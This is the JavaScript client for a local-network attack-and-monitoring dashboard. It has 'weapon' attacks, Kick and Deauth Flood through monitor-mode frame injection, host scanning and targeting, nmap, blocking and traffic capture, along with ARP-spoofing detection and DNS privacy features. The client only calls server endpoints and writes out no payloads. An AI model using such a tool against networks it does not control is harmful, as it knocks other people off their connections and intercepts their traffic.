// Tabs
document.querySelectorAll('.tab-btn').forEach(btn => {
  btn.addEventListener('click', () => {
    document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
    document.querySelectorAll('.tab-content').forEach(t => t.classList.remove('active'));
    btn.classList.add('active');
    document.getElementById('tab-' + btn.dataset.tab).classList.add('active');
    if (btn.dataset.tab === 'attacks') refreshDeauthCapability();
  });
});

// Weapon selection
document.querySelectorAll('.weapon-btn').forEach(el => {
  el.addEventListener('click', () => {
    document.querySelectorAll('.weapon-btn').forEach(b => b.classList.remove('active'));
    el.classList.add('active');
    selectedWeapon = parseInt(el.dataset.w, 10);
  });
});

// Global status
function updateGlobalStatus(text, running=false) {
  document.getElementById('status-text').textContent = text;
  const dot = document.getElementById('status-dot');
  dot.className = 'status-dot' + (running ? ' running' : '');
}

// Poll logs
async function pollLogs() {
  try {
    const data = await apiCall('logs');
    const container = document.getElementById('log-container');
    container.innerHTML = '';
    data.logs.slice(-100).forEach(entry => {
      const div = document.createElement('div');
      div.className = 'log-entry ' + entry.level;
      div.innerHTML = `<span class="time">[${entry.time}]</span><span class="msg">${entry.msg}</span>`;
      container.appendChild(div);
    });
    container.scrollTop = container.scrollHeight;
  } catch(e) {}
}
function clearServerLogs() {
  apiCall('clear_logs', 'POST').then(pollLogs);
}

// Live traffic capture
async function pollTrafficCapture() {
  try {
    const res = await apiCall('monitor_log');
    const container = document.getElementById('traffic-container');
    const empty = document.getElementById('traffic-empty');
    if (res.lines && res.lines.length) {
      empty.style.display = 'none';
      container.style.display = 'block';
      container.innerHTML = res.lines.map(l => `<div class="log-entry"><span class="msg">${l}</span></div>`).join('');
      container.scrollTop = container.scrollHeight;
    } else {
      container.style.display = 'none';
      empty.style.display = 'block';
      empty.textContent = res.capturing
        ? 'Capturing... waiting for matching traffic.'
        : 'Not capturing. Select weapon 5 on the Attacks tab and press Start.';
    }
    const attacksStatus = document.getElementById('attacks-traffic-status');
    if (attacksStatus) {
      attacksStatus.textContent = res.capturing
        ? `Capturing — ${res.lines.length} recent connection(s) logged. See the Monitor tab for the full analysis panel.`
        : 'Not capturing.';
    }
  } catch(e) {}
  refreshTrafficStats();
}

function escapeHtml(s) {
  const div = document.createElement('div');
  div.textContent = s == null ? '' : String(s);
  return div.innerHTML;
}

function formatBytes(n) {
  if (n > 1024 * 1024) return (n / 1024 / 1024).toFixed(2) + ' MB';
  if (n > 1024) return (n / 1024).toFixed(1) + ' KB';
  return n + ' B';
}
async function refreshTrafficStats() {
  try {
    const res = await apiCall('traffic_stats');
    if (!res.success) return;
    document.getElementById('traffic-capturing-badge').innerHTML =
      `<span class="badge ${res.capturing ? 'success' : 'info'}">${res.capturing ? 'Capturing' : 'Idle'}</span>`;
    document.getElementById('traffic-stat-total').textContent = res.total;
    document.getElementById('traffic-stat-hosts').textContent = res.unique_hosts;
    document.getElementById('traffic-stat-bytes').textContent = formatBytes(res.total_bytes);

    const w = 300, h = 50, pad = 3;
    const max = Math.max(1, ...res.timeline);
    const points = res.timeline.map((v, i) => {
      const x = res.timeline.length > 1 ? (i / (res.timeline.length - 1)) * w : 0;
      const y = h - pad - (v / max) * (h - pad * 2);
      return `${x.toFixed(1)},${y.toFixed(1)}`;
    }).join(' ');
    document.getElementById('traffic-spark-line').setAttribute('points', points);

    const talkersBody = document.getElementById('traffic-talkers-body');
    const talkersEmpty = document.getElementById('traffic-talkers-empty');
    talkersEmpty.style.display = res.top_talkers.length ? 'none' : 'block';
    talkersBody.innerHTML = res.top_talkers.map(t => `
      <tr>
        <td data-label="Host">${escapeHtml(t.host)}</td>
        <td data-label="Connections">${t.count}</td>
        <td data-label="Data">${formatBytes(t.bytes)}</td>
      </tr>
    `).join('');

    const portsBody = document.getElementById('traffic-ports-body');
    const portsEmpty = document.getElementById('traffic-ports-empty');
    portsEmpty.style.display = res.top_ports.length ? 'none' : 'block';
    portsBody.innerHTML = res.top_ports.map(p => `
      <tr>
        <td data-label="Service">${escapeHtml(p.service)}</td>
        <td data-label="Port">${p.port}</td>
        <td data-label="Protocol">${p.proto.toUpperCase()}</td>
        <td data-label="Connections">${p.count}</td>
        <td data-label="Data">${formatBytes(p.bytes)}</td>
      </tr>
    `).join('');
  } catch(e) {}
}

// Live bandwidth
function formatBps(bps) {
  if (bps > 1024 * 1024) return (bps / 1024 / 1024).toFixed(2) + ' MB/s';
  if (bps > 1024) return (bps / 1024).toFixed(1) + ' KB/s';
  return Math.round(bps) + ' B/s';
}
function drawBandwidthSparkline() {
  const max = Math.max(1, ...bwRxHistory, ...bwTxHistory);
  const w = 300, h = 56, pad = 4;
  const toPoints = (arr) => arr.map((v, i) => {
    const x = arr.length > 1 ? (i / (arr.length - 1)) * w : 0;
    const y = h - pad - (v / max) * (h - pad * 2);
    return `${x.toFixed(1)},${y.toFixed(1)}`;
  }).join(' ');
  document.getElementById('bw-spark-rx').setAttribute('points', toPoints(bwRxHistory));
  document.getElementById('bw-spark-tx').setAttribute('points', toPoints(bwTxHistory));
}
async function pollBandwidth() {
  try {
    const res = await apiCall('bandwidth');
    const empty = document.getElementById('bw-empty');
    if (!res.success) {
      empty.style.display = 'block';
      empty.textContent = res.error || 'No bandwidth data available.';
      return;
    }
    empty.style.display = 'none';
    document.getElementById('bw-rx').textContent = formatBps(res.rx_bps) + ' ↓';
    document.getElementById('bw-tx').textContent = formatBps(res.tx_bps) + ' ↑';
    bwRxHistory.push(res.rx_bps);
    bwTxHistory.push(res.tx_bps);
    if (bwRxHistory.length > 40) bwRxHistory.shift();
    if (bwTxHistory.length > 40) bwTxHistory.shift();
    drawBandwidthSparkline();
  } catch(e) {}
}

// Gateway: DNS/VPN/proxy
async function refreshGatewayStatus() {
  try {
    const res = await apiCall('gateway/status');
    if (!res.success) return;
    document.getElementById('gw-local-ip').textContent = res.local_ip;
    document.getElementById('gw-external-ip').textContent = res.external_ip;
    document.getElementById('gw-dns-target').textContent = res.local_ip + ':' + 5335;
    document.getElementById('gw-proxy-target').textContent = res.local_ip + ':' + res.proxy.port;

    document.getElementById('gw-dns-badges').innerHTML = `
      <span class="badge ${res.dns.unbound ? 'success' : 'danger'}">Unbound ${res.dns.unbound ? 'up' : 'down'}</span>
      <span class="badge ${res.dns.dnscrypt ? 'success' : 'danger'}">DNSCrypt-proxy ${res.dns.dnscrypt ? 'up' : 'down'}</span>
    `;
    document.getElementById('gw-dns-status').textContent = `Blocklist: ${res.dns.blocklist_domains} domain(s) loaded.`;

    const vpnBox = document.getElementById('gw-vpn-status');
    if (res.vpn.active) {
      const which = res.vpn.wireguard ? 'WireGuard' : res.vpn.openvpn ? 'OpenVPN' : 'Cloudflare';
      vpnBox.innerHTML = `<span class="badge success">Active</span> ${which} tunnel detected — full-tunnel privacy.`;
    } else {
      vpnBox.innerHTML = `<span class="badge warning">Not detected</span> DNS is private, but your IP is still visible to sites you visit.`;
    }

    document.getElementById('gw-proxy-badge').innerHTML =
      `<span class="badge ${res.proxy.tinyproxy ? 'success' : 'danger'}">${res.proxy.tinyproxy ? 'Running' : 'Stopped'}</span>`;
    document.getElementById('gw-proxy-status').textContent = res.proxy.tinyproxy
      ? `Running on port ${res.proxy.port}. Point other devices' HTTP proxy at ${res.local_ip}:${res.proxy.port}.`
      : 'Not running.';
  } catch(e) {}
  refreshDdnsStatus();
  refreshNgrokStatus();
}
async function startGatewayDns() {
  showToast('Starting DNS privacy stack...', 'success');
  const res = await apiCall('gateway/dns/start', 'POST');
  showToast(res.status || res.error, res.success ? 'success' : 'error');
  refreshGatewayStatus();
}
async function stopGatewayDns() {
  const res = await apiCall('gateway/dns/stop', 'POST');
  showToast(res.status, 'success');
  refreshGatewayStatus();
}
async function updateGatewayBlocklist() {
  showToast('Fetching blocklist...', 'success');
  const res = await apiCall('gateway/dns/update_blocklist', 'POST');
  showToast(res.success ? `Blocklist updated: ${res.count} domains` : 'Blocklist update failed', res.success ? 'success' : 'error');
  refreshGatewayStatus();
}
async function testGatewayDns() {
  const box = document.getElementById('gw-dns-test-result');
  box.innerHTML = '<span class="spinner"></span> Testing...';
  const res = await apiCall('gateway/dns/test');
  const rows = Object.entries(res.results).map(([domain, r]) => {
    const label = r.error ? `error: ${r.error}` : (r.blocked ? 'blocked' : 'resolved');
    const mark = !r.error && r.ok ? '✓' : '✗ unexpected';
    return `
      <div class="log-entry ${!r.error && r.ok ? 'success' : 'error'}">
        <span class="msg">${domain}: ${label} ${mark}</span>
      </div>
    `;
  }).join('');
  box.innerHTML = `<div class="log-container">${rows}</div>`;
}
async function startGatewayProxy() {
  const res = await apiCall('gateway/proxy/start', 'POST');
  showToast(res.status || res.error, res.success ? 'success' : 'error');
  refreshGatewayStatus();
}
async function stopGatewayProxy() {
  const res = await apiCall('gateway/proxy/stop', 'POST');
  showToast(res.status, 'success');
  refreshGatewayStatus();
}

// Dynamic DNS
function onDdnsProviderChange() {
  const isDuck = document.getElementById('ddns-provider').value === 'duckdns';
  document.getElementById('ddns-duckdns-fields').style.display = isDuck ? 'flex' : 'none';
  document.getElementById('ddns-noip-fields').style.display = isDuck ? 'none' : 'flex';
}
async function loadDdnsConfig() {
  try {
    const res = await apiCall('ddns/config');
    if (!res.success) return;
    const cfg = res.config;
    if (cfg.provider) document.getElementById('ddns-provider').value = cfg.provider;
    onDdnsProviderChange();
    document.getElementById('ddns-domain').value = cfg.domain || '';
    document.getElementById('ddns-interval').value = cfg.interval_minutes || 5;
    document.getElementById('ddns-enabled').checked = !!cfg.enabled;
    if (cfg.username) document.getElementById('ddns-username').value = cfg.username;
  } catch(e) {}
}
async function saveDdnsConfig() {
  const provider = document.getElementById('ddns-provider').value;
  const body = {
    provider,
    domain: document.getElementById('ddns-domain').value.trim(),
    interval_minutes: parseInt(document.getElementById('ddns-interval').value, 10) || 5,
  };
  if (provider === 'duckdns') {
    body.token = document.getElementById('ddns-token').value.trim();
  } else {
    body.username = document.getElementById('ddns-username').value.trim();
    body.password = document.getElementById('ddns-password').value;
  }
  const res = await apiCall('ddns/config', 'POST', body);
  showToast(res.success ? 'DDNS settings saved' : res.error, res.success ? 'success' : 'error');
  refreshDdnsStatus();
}
async function toggleDdnsEnabled() {
  const enabled = document.getElementById('ddns-enabled').checked;
  const res = await apiCall('ddns/toggle', 'POST', { enabled });
  if (!res.success) {
    document.getElementById('ddns-enabled').checked = false;
    showToast(res.error, 'error');
    return;
  }
  showToast(enabled ? 'DDNS auto-update enabled' : 'DDNS auto-update disabled', 'success');
}
async function ddnsUpdateNow() {
  showToast('Updating DDNS...', 'success');
  const res = await apiCall('ddns/update_now', 'POST');
  showToast(res.success ? 'DDNS updated' : (res.error || 'DDNS update failed'), res.success ? 'success' : 'error');
  refreshDdnsStatus();
}
async function refreshDdnsStatus() {
  try {
    const res = await apiCall('ddns/config');
    if (!res.success) return;
    const cfg = res.config;
    const badge = document.getElementById('ddns-badge');
    const status = document.getElementById('ddns-status');
    if (!cfg.provider) {
      badge.innerHTML = '';
      status.textContent = 'Not configured.';
      return;
    }
    badge.innerHTML = `<span class="badge ${cfg.enabled ? 'success' : 'info'}">${cfg.enabled ? 'Auto-update on' : 'Auto-update off'}</span>`;
    if (cfg.last_update) {
      status.innerHTML = `<span class="badge ${cfg.last_status === 'ok' ? 'success' : 'danger'}">${escapeHtml(cfg.last_status)}</span> ${escapeHtml(cfg.domain)} → ${escapeHtml(cfg.last_ip || '?')} at ${escapeHtml(cfg.last_update)} — ${escapeHtml(cfg.last_message || '')}`;
    } else {
      status.textContent = `${cfg.provider} configured for ${cfg.domain}, not updated yet.`;
    }
  } catch(e) {}
}

// Remote tunnel (ngrok)
async function startNgrok() {
  const state = await apiCall('state');
  if (!state.auth_enabled) {
    const proceed = confirm(
      'No access token is configured for this UI (GODHAND_SECRET is unset). ' +
      'Anyone with the public ngrok URL will be able to control this tool and your network. ' +
      'Start the tunnel anyway?'
    );
    if (!proceed) return;
  }
  const authtoken = document.getElementById('ngrok-authtoken').value.trim();
  showToast('Starting ngrok tunnel...', 'success');
  const res = await apiCall('ngrok/start', 'POST', { authtoken });
  showToast(res.success ? (res.url ? `Tunnel live: ${res.url}` : 'Tunnel started') : res.error, res.success ? 'success' : 'error');
  refreshNgrokStatus();
}
async function stopNgrok() {
  const res = await apiCall('ngrok/stop', 'POST');
  showToast(res.status, 'success');
  refreshNgrokStatus();
}
async function refreshNgrokStatus() {
  try {
    const res = await apiCall('ngrok/status');
    if (!res.success) return;
    document.getElementById('ngrok-badge').innerHTML =
      `<span class="badge ${res.running ? 'success' : 'danger'}">${res.running ? 'Running' : 'Stopped'}</span>`;
    document.getElementById('ngrok-status').innerHTML = res.running
      ? (res.url ? `Public URL: <a href="${res.url}" target="_blank" rel="noopener">${res.url}</a>` : 'Running — URL not yet available, refresh in a moment.')
      : 'Not running.';
  } catch(e) {}
}

// Poll attack status
async function pollAttackStatus() {
  try {
    const data = await apiCall('attack_status');
    attackRunning = data.attacks;
    const anyRunning = Object.values(attackRunning).some(v => v);
    document.getElementById('start-btn').disabled = anyRunning;
    document.getElementById('stop-btn').disabled = !anyRunning;
    if (anyRunning) {
      const weapons = Object.keys(attackRunning).filter(k => attackRunning[k]);
      updateGlobalStatus('Running: ' + weapons.join(', '), true);
    } else {
      updateGlobalStatus('Ready');
    }
  } catch(e) {}
}

// Prerequisites
async function checkPrerequisites() {
  try {
    const state = await apiCall('state');
    const s = state.state;
    document.getElementById('settings-status').textContent =
      `Current: IFACE: ${s.interface || 'none'}, GW: ${s.gateway || 'none'}, PORT: ${s.port}`;
  } catch(e) {}
}

// Interface loading
async function loadInterfaces() {
  try {
    const data = await apiCall('interfaces');
    const sel = document.getElementById('iface-select');
    sel.innerHTML = '';
    data.interfaces.forEach(iface => {
      const opt = document.createElement('option');
      opt.value = iface.name;
      let label = iface.name;
      if (iface.ip) label += ' (' + iface.ip + ')';
      if (iface.wireless) label += ' 📶';
      opt.textContent = label;
      sel.appendChild(opt);
    });
    if (data.interfaces.length > 0) {
      const selected = data.interfaces.find(i => i.ip && i.wireless) || data.interfaces.find(i => i.ip) || data.interfaces[0];
      sel.value = selected.name;
      await setInterface();
    }
  } catch(e) {}
}

async function setInterface() {
  const iface = document.getElementById('iface-select').value;
  if (!iface) return;
  const res = await apiCall('set_interface', 'POST', { interface: iface });
  showToast(res.status, res.success ? 'success' : 'error');
  checkPrerequisites();
  refreshDeauthCapability();
}

// Honest deauth capability: native (own AP, no monitor mode) vs monitor mode vs unavailable.
// Deliberately not on a recurring timer -- checking monitor support can itself
// briefly flip interface mode, so this only runs on the Attacks tab and after
// the interface changes, not in the background.
async function refreshDeauthCapability() {
  const box = document.getElementById('deauth-capability');
  if (!box) return;
  try {
    const res = await apiCall('deauth_capability');
    if (!res.success) {
      box.textContent = 'Deauth method: ' + (res.error || 'unknown');
      return;
    }
    if (res.method === 'native') {
      box.innerHTML = `<span class="badge success">Native</span> ${res.iface_type} interface is your own access point — Kick / Deauth Flood use the kernel's station-del, no monitor mode. ${res.ap_station_count} station(s) currently associated.`;
    } else if (res.method === 'monitor') {
      box.innerHTML = `<span class="badge warning">Monitor mode</span> Interface is ${res.iface_type} — Kick / Deauth Flood will switch it to monitor mode and use frame injection.`;
    } else {
      box.innerHTML = `<span class="badge danger">Unavailable</span> Interface is ${res.iface_type} and doesn't support monitor mode — Kick / Deauth Flood can't function on this hardware.`;
    }
  } catch(e) {}
}
async function setGateway() {
  const gw = document.getElementById('gateway-input').value.trim();
  if (!gw) return;
  const res = await apiCall('set_gateway', 'POST', { gateway: gw });
  showToast(res.status, res.success ? 'success' : 'error');
  checkPrerequisites();
}
async function setPort() {
  const port = parseInt(document.getElementById('port-input').value, 10);
  if (isNaN(port) || port<1 || port>65535) return;
  const res = await apiCall('set_port', 'POST', { port });
  showToast(res.status, res.success ? 'success' : 'error');
  checkPrerequisites();
}

// Hosts
async function refreshHosts() {
  const scanBtn = document.getElementById('scan-btn');
  const spinner = document.getElementById('scan-spinner');
  scanBtn.disabled = true;
  spinner.style.display = 'inline-block';
  const res = await apiCall('scan');
  scanBtn.disabled = false;
  spinner.style.display = 'none';
  if (res.success) {
    currentHosts = res.hosts;
    renderHosts();
    if (watchWholeNetwork) syncWholeNetworkWatch();
  } else {
    showToast('Scan failed: ' + res.error, 'error');
  }
}

function renderHosts() {
  const tbody = document.getElementById('host-body');
  const empty = document.getElementById('host-empty');
  tbody.innerHTML = '';
  empty.style.display = currentHosts.length ? 'none' : 'block';
  currentHosts.forEach(h => {
    const isTarget = currentTargets.includes(h.ip);
    const tr = document.createElement('tr');
    tr.innerHTML = `
      <td data-label=""><input type="checkbox" class="host-check" data-ip="${h.ip}"></td>
      <td data-label="IP">${h.ip}${isTarget ? ' <span class="badge success">Target</span>' : ''}</td>
      <td data-label="MAC">${h.mac}</td>
      <td data-label="Reachability" id="reach-${h.ip}"><span class="badge info">Checking...</span></td>
      <td data-label="Action">
        ${isTarget
          ? `<button class="btn-icon" onclick="removeTargetByIP('${h.ip}')" title="Remove target">✕</button>`
          : `<button class="btn-icon" onclick="addTargetByIP('${h.ip}')" title="Add target">＋</button>`}
        <button class="btn-icon" onclick="openNmapModal('${h.ip}')" title="Nmap scan"><svg viewBox="0 0 24 24" width="16" height="16" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="4 17 10 11 4 5"></polyline><line x1="12" y1="19" x2="20" y2="19"></line></svg></button>
        <button class="btn-icon" onclick="kickIP('${h.ip}')" title="Kick"><svg viewBox="0 0 24 24" width="16" height="16" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M16 21v-2a4 4 0 0 0-4-4H5a4 4 0 0 0-4 4v2"></path><circle cx="8.5" cy="7" r="4"></circle><line x1="18" y1="8" x2="23" y2="13"></line><line x1="23" y1="8" x2="18" y2="13"></line></svg></button>
        <button class="btn-icon" onclick="toggleBlockIP('${h.ip}')" title="Block"><svg viewBox="0 0 24 24" width="16" height="16" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect><path d="M7 11V7a5 5 0 0 1 10 0v4"></path></svg></button>
      </td>
    `;
    tbody.appendChild(tr);
    serverCheckReachability(h.ip);
  });
}

async function serverCheckReachability(ip) {
  const cell = document.getElementById('reach-' + ip);
  if (!cell) return;
  const res = await apiCall('check_reachability?ip=' + encodeURIComponent(ip));
  if (res.reachable) {
    cell.innerHTML = `<span class="badge success">Reachable (${res.latency}ms)</span>`;
  } else {
    cell.innerHTML = `<span class="badge danger">No response</span>`;
  }
}

function toggleAllHosts() {
  const checked = document.getElementById('select-all-hosts').checked;
  document.querySelectorAll('.host-check').forEach(cb => cb.checked = checked);
}

async function bulkAddTargets() {
  const selectedIPs = Array.from(document.querySelectorAll('.host-check:checked')).map(cb => cb.dataset.ip);
  if (!selectedIPs.length) {
    showToast('No hosts selected', 'warning');
    return;
  }
  await Promise.all(selectedIPs.map(ip => addTargetByIP(ip, false)));
  loadTargets();
  renderHosts();
  showToast('Targets added', 'success');
}

// Targets
async function addTargetByIP(ip, refresh = true) {
  const res = await apiCall('add_target', 'POST', { ip });
  if (res.success) {
    showToast('Added target ' + ip, 'success');
    if (refresh) {
      loadTargets();
      renderHosts();
    }
  } else {
    showToast('Error: ' + res.error, 'error');
  }
}
async function removeTargetByIP(ip) {
  const res = await apiCall('remove_target', 'POST', { ip });
  if (res.success) {
    showToast('Removed target ' + ip, 'success');
    loadTargets();
    renderHosts();
  }
}
async function addTarget() {
  const ip = document.getElementById('target-ip').value.trim();
  if (!ip) return;
  await addTargetByIP(ip);
  document.getElementById('target-ip').value = '';
}
async function loadTargets() {
  const res = await apiCall('state');
  currentTargets = res.state.targets || [];
  const box = document.getElementById('target-chips');
  box.innerHTML = '';
  if (!currentTargets.length) {
    box.innerHTML = '<span class="empty-inline">No targets yet — scan below or add an IP manually.</span>';
    return;
  }
  currentTargets.forEach(ip => {
    const chip = document.createElement('span');
    chip.className = 'chip';
    chip.innerHTML = `
      <span class="chip-ip">${ip}</span>
      <button class="chip-action" onclick="openNmapModal('${ip}')" title="Nmap scan"><svg viewBox="0 0 24 24" width="14" height="14" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="4 17 10 11 4 5"></polyline><line x1="12" y1="19" x2="20" y2="19"></line></svg></button>
      <button class="chip-action" onclick="kickIP('${ip}')" title="Kick"><svg viewBox="0 0 24 24" width="14" height="14" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M16 21v-2a4 4 0 0 0-4-4H5a4 4 0 0 0-4 4v2"></path><circle cx="8.5" cy="7" r="4"></circle><line x1="18" y1="8" x2="23" y2="13"></line><line x1="23" y1="8" x2="18" y2="13"></line></svg></button>
      <button class="chip-action" onclick="toggleBlockIP('${ip}')" title="Block"><svg viewBox="0 0 24 24" width="14" height="14" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect><path d="M7 11V7a5 5 0 0 1 10 0v4"></path></svg></button>
      <button class="chip-action" onclick="removeTargetByIP('${ip}')" title="Remove target">✕</button>
    `;
    box.appendChild(chip);
  });
}

// Attacks
async function confirmStartAttack() {
  const state = await apiCall('state');
  if (!state.state.interface) {
    showToast('Interface not set. Go to Settings.', 'error');
    return;
  }
  if (state.running_attacks.length > 0) {
    showToast('An attack is already running.', 'warning');
    return;
  }
  openModal('Start Attack', `Start weapon ${selectedWeapon}?`, async () => {
    const btn = document.getElementById('start-btn');
    btn.disabled = true;
    btn.textContent = 'Starting...';
    const res = await apiCall('start_attack', 'POST', { weapon: selectedWeapon });
    btn.disabled = false;
    btn.textContent = '▶ Start';
    if (res.success) {
      showToast('Attack started: ' + res.weapon, 'success');
      pollAttackStatus();
    } else {
      showToast('Failed: ' + res.error, 'error');
    }
  });
}
async function confirmStopAttack() {
  openModal('Stop Attack', 'Stop all running attacks?', async () => {
    const res = await apiCall('stop_attack', 'POST');
    showToast(res.status, res.success ? 'success' : 'error');
    pollAttackStatus();
  });
}

// Kick/Block
async function kickIP(ip) {
  openModal('Kick Client', `Kick ${ip}?`, async () => {
    const res = await apiCall('kick', 'POST', { ip });
    showToast(res.status, res.success ? 'success' : 'error');
  });
}
async function toggleBlockIP(ip) {
  const res = await apiCall('block', 'POST', { ip });
  showToast(res.status, res.success ? 'success' : 'error');
}
function kickTypedIP() {
  const ip = document.getElementById('target-ip').value.trim();
  if (!ip) { showToast('Enter an IP first', 'warning'); return; }
  kickIP(ip);
}
function blockTypedIP() {
  const ip = document.getElementById('target-ip').value.trim();
  if (!ip) { showToast('Enter an IP first', 'warning'); return; }
  toggleBlockIP(ip);
}

// Device Watch
function renderDevices() {
  const tbody = document.querySelector('#dev-table tbody');
  const empty = document.getElementById('dev-empty');
  tbody.innerHTML = '';
  empty.style.display = devices.length ? 'none' : 'block';
  devices.forEach((d, i) => {
    const tr = document.createElement('tr');
    let badge = '<span class="badge info">Not checked</span>';
    if (d.status === 'up') badge = '<span class="badge success">Reachable</span>';
    else if (d.status === 'down') badge = '<span class="badge danger">No response</span>';
    else if (d.status === 'checking') badge = '<span class="badge warning">Checking...</span>';
    tr.innerHTML = `
      <td data-label="Label">${d.name || '—'}</td>
      <td data-label="IP">${d.ip}</td>
      <td data-label="Status">${badge}</td>
      <td data-label="Latency">${d.latency ? d.latency + ' ms' : '—'}</td>
      <td data-label="">
        <button class="btn-icon" onclick="checkDevice(${i})">↻</button>
        <button class="btn-icon" onclick="removeDevice(${i})">✕</button>
      </td>
    `;
    tbody.appendChild(tr);
  });
}
function addDevice() {
  const name = document.getElementById('dev-name').value.trim();
  const ip = document.getElementById('dev-ip').value.trim();
  if (!ip.match(/^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$/)) {
    showToast('Invalid IP', 'error');
    return;
  }
  devices.push({ name, ip, status: null, latency: null });
  localStorage.setItem('lg_devices', JSON.stringify(devices));
  document.getElementById('dev-name').value = '';
  document.getElementById('dev-ip').value = '';
  renderDevices();
}
function removeDevice(i) {
  devices.splice(i, 1);
  localStorage.setItem('lg_devices', JSON.stringify(devices));
  renderDevices();
}
async function checkDevice(i) {
  const d = devices[i];
  d.status = 'checking';
  renderDevices();
  const res = await apiCall('check_reachability?ip=' + encodeURIComponent(d.ip));
  if (res.reachable) {
    d.latency = res.latency;
    d.status = 'up';
  } else {
    d.status = 'down';
    d.latency = null;
  }
  localStorage.setItem('lg_devices', JSON.stringify(devices));
  renderDevices();
}
function checkAllDevices() {
  devices.forEach((_, i) => checkDevice(i));
}
function toggleWatchWholeNetwork() {
  watchWholeNetwork = document.getElementById('watch-whole-network').checked;
  localStorage.setItem('lg_watch_whole_network', watchWholeNetwork ? '1' : '0');
  if (watchWholeNetwork) syncWholeNetworkWatch();
}
function syncWholeNetworkWatch() {
  let added = 0;
  currentHosts.forEach(h => {
    if (!devices.some(d => d.ip === h.ip)) {
      devices.push({ name: '', ip: h.ip, status: null, latency: null });
      added++;
    }
  });
  if (added) {
    localStorage.setItem('lg_devices', JSON.stringify(devices));
    renderDevices();
    checkAllDevices();
  }
}
function addSelectedToWatch() {
  const selectedIPs = Array.from(document.querySelectorAll('.host-check:checked')).map(cb => cb.dataset.ip);
  if (!selectedIPs.length) {
    showToast('No hosts selected', 'warning');
    return;
  }
  let added = 0;
  selectedIPs.forEach(ip => {
    if (!devices.some(d => d.ip === ip)) {
      devices.push({ name: '', ip, status: null, latency: null });
      added++;
    }
  });
  localStorage.setItem('lg_devices', JSON.stringify(devices));
  renderDevices();
  checkAllDevices();
  showToast(`Added ${added} device(s) to watch`, 'success');
}

// ARP Detector
function parseArpText(text) {
  const entries = {};
  const lines = text.split('\n');
  const ipRe = /(\d{1,3}(?:\.\d{1,3}){3})/;
  const macRe = /([0-9a-fA-F]{2}[:-]){5}[0-9a-fA-F]{2}/;
  lines.forEach(line => {
    const ipm = line.match(ipRe);
    const macm = line.match(macRe);
    if (ipm && macm) {
      const ip = ipm[1];
      const mac = macm[0].toLowerCase().replace(/-/g, ':');
      entries[ip] = mac;
    }
  });
  return entries;
}
function ingestArp() {
  const text = document.getElementById('arp-input').value;
  const entries = parseArpText(text);
  if (Object.keys(entries).length === 0) {
    pushAlert("Couldn't parse any IP/MAC pairs from that input.", 'warn');
    renderAlerts();
    return;
  }
  const snapshot = { time: new Date().toISOString(), entries };
  if (arpHistory.length > 0) {
    const prev = arpHistory[arpHistory.length - 1];
    Object.keys(entries).forEach(ip => {
      if (prev.entries[ip] && prev.entries[ip] !== entries[ip]) {
        pushAlert(`IP ${ip} changed MAC address: ${prev.entries[ip]} → ${entries[ip]}. Could be legit or ARP spoofing.`, 'bad');
      }
    });
    const macToIps = {};
    Object.entries(entries).forEach(([ip, mac]) => {
      macToIps[mac] = macToIps[mac] || [];
      macToIps[mac].push(ip);
    });
    Object.entries(macToIps).forEach(([mac, ips]) => {
      if (ips.length > 1) {
        pushAlert(`MAC ${mac} is claiming multiple IPs: ${ips.join(', ')}. ARP spoofing likely.`, 'bad');
      }
    });
  }
  arpHistory.push(snapshot);
  localStorage.setItem('lg_arp_history', JSON.stringify(arpHistory));
  document.getElementById('arp-snap-count').textContent = arpHistory.length;
  renderAlerts();
}
function clearArpHistory() {
  arpHistory = [];
  localStorage.setItem('lg_arp_history', JSON.stringify(arpHistory));
  document.getElementById('arp-snap-count').textContent = 0;
}
function analyzeDeauth() {
  const text = document.getElementById('deauth-input').value.trim();
  if (!text) return;
  const nums = text.split(/[\n,]+/).map(s => parseFloat(s.trim())).filter(n => !isNaN(n));
  if (nums.length < 3) {
    pushAlert('Need at least a few readings.', 'warn');
    renderAlerts();
    return;
  }
  const mean = nums.reduce((a, b) => a + b, 0) / nums.length;
  const std = Math.sqrt(nums.reduce((a, b) => a + (b - mean) ** 2, 0) / nums.length) || 1;
  nums.forEach((n, i) => {
    if (n > mean + 3 * std && n > 10) {
      pushAlert(`Reading #${i + 1} (value ${n}) is a major spike above baseline.`, 'bad');
    }
  });
  renderAlerts();
}
function pushAlert(msg, level) {
  alerts.unshift({ msg, level, time: new Date().toLocaleString() });
  alerts = alerts.slice(0, 50);
  localStorage.setItem('lg_alerts', JSON.stringify(alerts));
  apiCall('add_log', 'POST', { level: level === 'bad' ? 'error' : 'warn', msg });
}
function renderAlerts() {
  const box = document.getElementById('alerts');
  const empty = document.getElementById('alerts-empty');
  box.innerHTML = '';
  empty.style.display = alerts.length ? 'none' : 'block';
  alerts.forEach(a => {
    const div = document.createElement('div');
    div.className = 'alert-item ' + (a.level === 'warn' ? 'warn' : '');
    div.innerHTML = `${a.msg}<div class="t">${a.time}</div>`;
    box.appendChild(div);
  });
}

// Login gate
let appInitialized = false;
function addRipple(btn, event) {
  const rect = btn.getBoundingClientRect();
  const ripple = document.createElement('span');
  const size = Math.max(rect.width, rect.height);
  ripple.className = 'login-ripple';
  ripple.style.width = ripple.style.height = size + 'px';
  ripple.style.left = (event.clientX - rect.left - size / 2) + 'px';
  ripple.style.top = (event.clientY - rect.top - size / 2) + 'px';
  btn.appendChild(ripple);
  setTimeout(() => ripple.remove(), 600);
}
function showLogin() {
  document.getElementById('login-screen').style.display = 'flex';
  document.getElementById('app-shell').style.display = 'none';
  document.getElementById('login-password').value = '';
  document.getElementById('login-username').focus();
}
function showApp() {
  document.getElementById('login-screen').style.display = 'none';
  document.getElementById('app-shell').style.display = 'block';
  document.getElementById('logout-btn').style.display = authToken ? 'inline-flex' : 'none';
  if (!appInitialized) {
    appInitialized = true;
    initApp();
  }
}
async function handleLogin(event) {
  event.preventDefault();
